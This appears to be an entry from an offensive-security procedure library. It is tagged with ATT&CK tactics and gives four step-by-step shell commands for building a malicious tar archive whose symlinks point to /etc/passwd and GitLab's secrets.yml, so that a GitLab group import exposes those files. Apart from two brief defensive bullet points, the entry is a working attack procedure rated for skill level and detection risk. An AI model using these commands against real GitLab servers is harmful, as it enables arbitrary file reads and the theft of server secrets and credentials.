---
id: 336ad47c-c4bf-43b2-befc-d060b74b98ff
type: procedure
verified: false
submitted: true
created_at: '2025-12-11T03:48:05.916Z'
updated_at: '2025-12-11T03:48:05.916Z'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
sub_techniques: []
tags:
  - symlink
  - tar
commands: []
platforms:
  - Linux
tools:
  - '[[tools/Flask]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0009]]'
mitre_techniques:
  - '[[T1190]]'
  - '[[T1083]]'
---

# Create Malicious Tar File with Symlinks

## Summary

This procedure creates a malicious tar file containing symlinks to sensitive server files, exploiting the symlink preservation in GitLab's UploadsPipeline.

## Description

Using Linux commands, a directory is created with the extracted upload secret hash as its name. Symlinks are then added pointing to /etc/passwd and /srv/gitlab/config/secrets.yml. The directory is archived into uploads.tar.gz, which will be served during the import to enable arbitrary file reads. This targets Linux-based GitLab servers, resulting in potential exposure of sensitive data.

## Requirements

1. Linux environment
2. Extracted upload secret hash
3. Write permissions in working directory

## Defense

Defensive measures and detection strategies:

- Filter symlinks during tar extraction in import pipelines
- Monitor for anomalous file accesses by git user

## Objectives

1. Craft payload with symlinks to sensitive files
2. Prepare tar for injection via proxy
3. Enable arbitrary file read upon import

## Instructions

### Step 1: Create Directory

**Context**: Preparing structure for malicious tar file to exploit symlink vulnerability.

**Command** ([[commands/mkdir-create-upload-dir]]):
```bash
mkdir ./d3209c811fee407218bff7cb3b4333e6
```

> Creates the directory with the upload secret hash.

### Step 2: Create Symlink to passwd

**Context**: Setting up symlink to read server's passwd file via import.

**Command** ([[commands/ln-symlink-passwd]]):
```bash
ln -s /etc/passwd ./d3209c811fee407218bff7cb3b4333e6/passwd
```

> Creates the symlink to /etc/passwd.

### Step 3: Create Symlink to secrets.yml

**Context**: Setting up symlink to read GitLab's secrets.yml file via import.

**Command** ([[commands/ln-symlink-secrets]]):
```bash
ln -s /srv/gitlab/config/secrets.yml ./d3209c811fee407218bff7cb3b4333e6/secrets.yml
```

> Creates the symlink to secrets.yml.

### Step 4: Archive Directory

**Context**: Generating malicious tar for proxy to serve during group import.

**Command** ([[commands/tar-create-uploads-archive]]):
```bash
tar cvzf uploads.tar.gz ./d3209c811fee407218bff7cb3b4333e6
```

> Creates the gzipped tar file.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[File and Directory Discovery]]

### Sub-Techniques



## Commands Used

- [[commands/mkdir-create-upload-dir]]
- [[commands/ln-symlink-passwd]]
- [[commands/ln-symlink-secrets]]
- [[commands/tar-create-uploads-archive]]

## Tools Used

- #mkdir
- #ln
- #tar

## Tags

- [[commands/ln-symlink-passwd]]
- #tar
